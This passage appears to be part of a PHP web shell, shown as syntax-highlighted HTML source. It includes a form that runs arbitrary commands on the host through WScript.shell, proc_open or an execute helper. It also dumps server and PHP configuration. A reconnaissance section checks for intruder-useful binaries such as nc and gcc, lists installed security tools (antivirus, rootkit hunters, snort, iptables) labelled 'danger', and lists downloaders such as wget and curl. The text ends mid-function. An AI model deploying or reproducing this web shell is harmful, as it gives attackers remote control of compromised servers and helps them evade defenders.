        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">formfoot</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Execute Command&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;shell&#39;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_WIN</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_COM</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$execfuncdb</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;phpfunc&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;phpfunc&#39;</span><span class="p">,</span><span class="s1">&#39;wscript&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;wscript&#39;</span><span class="p">,</span><span class="s1">&#39;proc_open&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;proc_open&#39;</span><span class="p">);</span>
        <span class="nx">makeselect</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Use:&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;execfunc&#39;</span><span class="p">,</span><span class="s1">&#39;option&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$execfuncdb</span><span class="p">,</span><span class="s1">&#39;selected&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$execfunc</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Command&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;command&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$command</span><span class="p">)));</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;bt&#39;</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Execute&#39;</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$command</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;hr width=&quot;100%&quot; noshade /&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$execfunc</span><span class="o">==</span><span class="s1">&#39;wscript&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_WIN</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_COM</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$wsh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;WScript.shell&#39;</span><span class="p">);</span>
            <span class="nv">$exec</span> <span class="o">=</span> <span class="nv">$wsh</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;cmd.exe /c &#39;</span><span class="o">.</span><span class="nv">$command</span><span class="p">);</span>
            <span class="nv">$stdout</span> <span class="o">=</span> <span class="nv">$exec</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">StdOut</span><span class="p">();</span>
            <span class="nv">$stroutput</span> <span class="o">=</span> <span class="nv">$stdout</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ReadAll</span><span class="p">();</span>
            <span class="k">echo</span> <span class="nv">$stroutput</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$execfunc</span><span class="o">==</span><span class="s1">&#39;proc_open&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_WIN</span> <span class="o">&amp;&amp;</span> <span class="nx">IS_COM</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
               <span class="mi">0</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">),</span>
               <span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">),</span>
               <span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
            <span class="p">);</span>
            <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;COMSPEC&#39;</span><span class="p">],</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$command</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
                <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s2">&quot;exit</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1024</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">1024</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
                <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span><span class="p">(</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$command</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span><span class="c1">//end shell</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;phpenv&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$upsize</span><span class="o">=</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;file_uploads&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;upload_max_filesize&#39;</span><span class="p">)</span> <span class="o">:</span> <span class="s1">&#39;Not allowed&#39;</span><span class="p">;</span>
    <span class="nv">$adminmail</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_ADMIN&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_ADMIN&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;sendmail_from&#39;</span><span class="p">);</span>
    <span class="o">!</span><span class="nv">$dis_func</span> <span class="o">&amp;&amp;</span> <span class="nv">$dis_func</span> <span class="o">=</span> <span class="s1">&#39;No&#39;</span><span class="p">;</span> 
    <span class="nv">$info</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server Time&#39;</span><span class="p">,</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y/m/d h:i:s&#39;</span><span class="p">,</span><span class="nv">$timestamp</span><span class="p">)),</span>
        <span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server Domain&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">]),</span>
        <span class="mi">3</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server IP&#39;</span><span class="p">,</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">])),</span>
        <span class="mi">4</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server OS&#39;</span><span class="p">,</span><span class="k">PHP_OS</span><span class="p">),</span>
        <span class="mi">5</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server OS Charset&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_ACCEPT_LANGUAGE&#39;</span><span class="p">]),</span>
        <span class="mi">6</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server Software&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">]),</span>
        <span class="mi">7</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Server Web Port&#39;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_PORT&#39;</span><span class="p">]),</span>
        <span class="mi">8</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;PHP run mode&#39;</span><span class="p">,</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nb">php_sapi_name</span><span class="p">())),</span>
        <span class="mi">9</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;The file path&#39;</span><span class="p">,</span><span class="k">__FILE__</span><span class="p">),</span>

        <span class="mi">10</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;PHP Version&#39;</span><span class="p">,</span><span class="k">PHP_VERSION</span><span class="p">),</span>
        <span class="mi">11</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;PHPINFO&#39;</span><span class="p">,(</span><span class="nx">IS_PHPINFO</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;a href=&quot;javascript:g(\&#39;phpinfo\&#39;);&quot;&amp;gt;Yes&amp;lt;/a&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;No&#39;</span><span class="p">)),</span>
        <span class="mi">12</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Safe Mode&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">)),</span>
        <span class="mi">13</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Administrator&#39;</span><span class="p">,</span><span class="nv">$adminmail</span><span class="p">),</span>
        <span class="mi">14</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;allow_url_fopen&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;allow_url_fopen&#39;</span><span class="p">)),</span>
        <span class="mi">15</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;enable_dl&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;enable_dl&#39;</span><span class="p">)),</span>
        <span class="mi">16</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">)),</span>
        <span class="mi">17</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;register_globals&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;register_globals&#39;</span><span class="p">)),</span>
        <span class="mi">18</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;magic_quotes_gpc&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;magic_quotes_gpc&#39;</span><span class="p">)),</span>
        <span class="mi">19</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;memory_limit&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;memory_limit&#39;</span><span class="p">)),</span>
        <span class="mi">20</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;post_max_size&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;post_max_size&#39;</span><span class="p">)),</span>
        <span class="mi">21</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;upload_max_filesize&#39;</span><span class="p">,</span><span class="nv">$upsize</span><span class="p">),</span>
        <span class="mi">22</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; second(s)&#39;</span><span class="p">),</span>
        <span class="mi">23</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">,</span><span class="nv">$dis_func</span><span class="p">),</span>
    <span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$phpvarname</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">m</span><span class="p">(</span><span class="nv">$phpvarname</span> <span class="o">.</span><span class="s1">&#39; : &#39;</span><span class="o">.</span><span class="nx">getcfg</span><span class="p">(</span><span class="nv">$phpvarname</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Server environment&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;phpenv&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;Please input PHP configuration parameter(eg:magic_quotes_gpc)&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;phpvarname&#39;</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$phpvarname</span><span class="p">,</span><span class="s1">&#39;newline&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">formfooter</span><span class="p">();</span>

    <span class="nv">$hp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;Server&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;PHP&#39;</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$a</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="mi">2</span><span class="p">;</span><span class="nv">$a</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$hp</span><span class="p">[</span><span class="nv">$a</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;ul class=&quot;info&quot;&amp;gt;&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="mi">9</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;li&amp;gt;&amp;lt;u&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;:&amp;lt;/u&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/li&amp;gt;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">10</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="mi">23</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;li&amp;gt;&amp;lt;u&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;:&amp;lt;/u&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$info</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/li&amp;gt;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/ul&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span><span class="c1">//end phpenv</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;secinfo&#39;</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;none&#39;</span><span class="p">);</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;enabled&#39;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
    <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span><span class="o">.</span><span class="nb">mysql_get_client_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span>
    <span class="nx">secparam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
    
    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">IS_WIN</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span>
        <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span><span class="s1">&#39;nod32&#39;</span><span class="p">,</span><span class="s1">&#39;bdcored&#39;</span><span class="p">,</span><span class="s1">&#39;uvscan&#39;</span><span class="p">,</span><span class="s1">&#39;sav&#39;</span><span class="p">,</span><span class="s1">&#39;drwebd&#39;</span><span class="p">,</span><span class="s1">&#39;clamd&#39;</span><span class="p">,</span><span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span><span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span><span class="s1">&#39;iptables&#39;</span><span class="p">,</span><span class="s1">&#39;ipfw&#39;</span><span class="p">,</span><span class="s1">&#39;tripwire&#39;</span><span class="p">,</span><span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span><span class="s1">&#39;portsentry&#39;</span><span class="p">,</span><span class="s1">&#39;snort&#39;</span><span class="p">,</span><span class="s1">&#39;ossec&#39;</span><span class="p">,</span><span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span><span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span><span class="s1">&#39;sxid&#39;</span><span class="p">,</span><span class="s1">&#39;logcheck&#39;</span><span class="p">,</span><span class="s1">&#39;logwatch&#39;</span><span class="p">,</span><span class="s1">&#39;sysmask&#39;</span><span class="p">,</span><span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span><span class="s1">&#39;sawmill&#39;</span><span class="p">,</span><span class="s1">&#39;wormscan&#39;</span><span class="p">,</span><span class="s1">&#39;ninja&#39;</span><span class="p">);</span>
        <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span>
